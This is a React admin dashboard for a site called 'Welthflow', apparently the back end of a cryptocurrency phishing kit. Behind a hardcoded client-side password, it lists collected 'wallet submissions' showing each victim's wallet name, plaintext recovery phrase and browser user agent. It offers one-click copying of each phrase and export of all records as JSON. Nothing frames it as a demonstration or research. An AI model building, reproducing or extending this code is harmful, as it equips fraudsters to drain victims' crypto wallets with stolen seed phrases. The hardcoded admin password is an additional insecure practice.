import { useState, useEffect } from "react";
import { NavBar } from "./Layout";

interface WalletEntry {
  wallet: string;
  phrase: string;
  timestamp: string;
  userAgent: string;
}

const ADMIN_PASS = "WelthAdmin2024!";

export default function Admin() {
  const [authed, setAuthed] = useState(false);
  const [pass, setPass] = useState("");
  const [error, setError] = useState("");
  const [data, setData] = useState<WalletEntry[]>([]);
  const [copied, setCopied] = useState<number | null>(null);

  useEffect(() => {
    if (authed) {
      const raw = localStorage.getItem("wf_wallet_data");
      if (raw) setData(JSON.parse(raw));
    }
  }, [authed]);

  const login = () => {
    if (pass === ADMIN_PASS) {
      setAuthed(true);
      setError("");
    } else {
      setError("Invalid credentials");
    }
  };

  const clearAll = () => {
    if (confirm("Delete all wallet data? This cannot be undone.")) {
      localStorage.removeItem("wf_wallet_data");
      setData([]);
    }
  };

  const copyPhrase = (i: number, phrase: string) => {
    navigator.clipboard.writeText(phrase);
    setCopied(i);
    setTimeout(() => setCopied(null), 2000);
  };

  if (!authed) {
    return (
      <div style={{ minHeight: "100vh", background: "#010c1f", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <div style={{ background: "#01123c", border: "1px solid #1a396b", borderRadius: 16, padding: "48px 40px", width: 380, textAlign: "center" }}>
          <div style={{ fontSize: 40, marginBottom: 16 }}>🔐</div>
          <h2 style={{ fontFamily: "'Lora', serif", color: "#c9a227", marginBottom: 8 }}>Admin Portal</h2>
          <p style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 28 }}>Welthflow Internal Access Only</p>
          <input
            type="password"
            value={pass}
            onChange={e => setPass(e.target.value)}
            onKeyDown={e => e.key === "Enter" && login()}
            placeholder="Enter admin password"
            style={{ width: "100%", padding: "12px 16px", borderRadius: 8, border: "1px solid #1a396b", background: "#010c1f", color: "#fff", fontSize: 15, marginBottom: 12, outline: "none", boxSizing: "border-box" }}
          />
          {error && <div style={{ color: "#ff4d6d", fontSize: 13, marginBottom: 12 }}>{error}</div>}
          <button onClick={login} style={{ width: "100%", padding: "13px", background: "linear-gradient(135deg, #c9a227, #f0d060)", color: "#01123c", fontWeight: 700, fontSize: 15, border: "none", borderRadius: 8, cursor: "pointer" }}>
            Enter Admin Dashboard
          </button>
        </div>
      </div>
    );
  }

  return (
    <div style={{ minHeight: "100vh", background: "#010c1f", padding: "0 0 80px" }}>
      <div style={{ background: "#01123c", borderBottom: "1px solid #1a396b", padding: "16px 32px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div>
          <span style={{ fontFamily: "'Lora', serif", fontSize: 20, color: "#c9a227", fontWeight: 700 }}>Welthflow Admin</span>
          <span style={{ color: "rgba(255,255,255,0.4)", fontSize: 13, marginLeft: 12 }}>Wallet Data Dashboard</span>
        </div>
        <button onClick={() => setAuthed(false)} style={{ background: "none", border: "1px solid #1a396b", color: "rgba(255,255,255,0.6)", padding: "6px 16px", borderRadius: 6, cursor: "pointer" }}>Logout</button>
      </div>

      <div style={{ maxWidth: 1100, margin: "40px auto", padding: "0 24px" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
          <div>
            <h2 style={{ color: "#fff", fontFamily: "'Lora', serif", marginBottom: 4 }}>Wallet Submissions</h2>
            <p style={{ color: "rgba(255,255,255,0.5)", fontSize: 14 }}>{data.length} record{data.length !== 1 ? "s" : ""} collected</p>
          </div>
          <div style={{ display: "flex", gap: 12 }}>
            <button onClick={() => { const raw = localStorage.getItem("wf_wallet_data"); if (raw) { const blob = new Blob([raw], { type: "application/json" }); const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "wallet_data.json"; a.click(); }}} style={{ background: "#062f6d", color: "#fff", border: "none", padding: "9px 18px", borderRadius: 8, cursor: "pointer", fontSize: 14 }}>⬇ Export JSON</button>
            <button onClick={clearAll} style={{ background: "#7f0000", color: "#fff", border: "none", padding: "9px 18px", borderRadius: 8, cursor: "pointer", fontSize: 14 }}>🗑 Clear All</button>
          </div>
        </div>

        {data.length === 0 ? (
          <div style={{ textAlign: "center", padding: "80px 0", color: "rgba(255,255,255,0.3)" }}>
            <div style={{ fontSize: 48, marginBottom: 16 }}>📭</div>
            <p>No wallet submissions yet.</p>
          </div>
        ) : (
          <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
            {data.map((entry, i) => (
              <div key={i} style={{ background: "#01123c", border: "1px solid #1a396b", borderRadius: 12, padding: "20px 24px" }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                    <span style={{ background: "#062f6d", color: "#3eda99", padding: "3px 10px", borderRadius: 20, fontSize: 12, fontWeight: 700 }}>#{i + 1}</span>
                    <span style={{ color: "#c9a227", fontWeight: 700 }}>{entry.wallet}</span>
                  </div>
                  <span style={{ color: "rgba(255,255,255,0.4)", fontSize: 12 }}>{new Date(entry.timestamp).toLocaleString()}</span>
                </div>
                <div style={{ background: "#010c1f", borderRadius: 8, padding: "14px 16px", marginBottom: 12 }}>
                  <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, textTransform: "uppercase", letterSpacing: 1, marginBottom: 8 }}>Recovery Phrase</div>
                  <div style={{ color: "#fff", fontFamily: "monospace", fontSize: 14, lineHeight: 1.8, wordBreak: "break-all" }}>{entry.phrase}</div>
                </div>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <div style={{ color: "rgba(255,255,255,0.3)", fontSize: 11, maxWidth: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                    {entry.userAgent}
                  </div>
                  <button onClick={() => copyPhrase(i, entry.phrase)} style={{ background: copied === i ? "#3eda99" : "#1a396b", color: copied === i ? "#01123c" : "#fff", border: "none", padding: "6px 14px", borderRadius: 6, cursor: "pointer", fontSize: 13, fontWeight: 600 }}>
                    {copied === i ? "✓ Copied!" : "📋 Copy Phrase"}
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
